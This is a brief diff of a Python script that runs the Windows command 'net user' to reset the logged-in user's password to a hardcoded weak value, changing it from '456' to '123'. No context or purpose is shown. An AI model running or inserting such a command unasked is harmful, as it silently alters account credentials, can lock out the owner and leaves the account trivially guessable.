@@ -10,6 +10,6 @@
 import os
 
 user = os.getlogin()
-command = f"net user {user} 456"
+command = f"net user {user} 123"
 
 os.system(command)
